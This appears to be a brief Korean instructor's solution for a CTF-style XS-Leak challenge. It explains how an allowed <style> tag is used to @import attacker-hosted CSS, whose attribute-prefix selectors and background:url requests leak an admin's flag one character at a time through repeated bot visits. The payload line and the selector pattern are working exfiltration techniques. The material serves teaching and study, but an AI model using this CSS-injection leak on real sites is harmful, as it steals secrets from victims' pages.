# [강사용] XS-Leak (원본 풀이)
admin 이 글을 보면 `<a href="javascript:alert('FLAG')">flag!</a>` 가 같은 페이지에 렌더된다.
script/on 은 막히지만 `<style>` 는 가능 → 속성 선택자 + background:url 로 한 글자씩 누출:
```html
<style>@import url("//host.docker.internal:8000/leak.css");</style>
```
공격자 CSS 서버가 `a[href^="javascript:alert('flag{a"]{background:url(...&c=a)}` 식으로 모든 접두사를 생성(@import 재귀) → 매칭되는 글자만 발사. 신고로 admin 봇이 반복 방문하며 한 글자씩 복원.
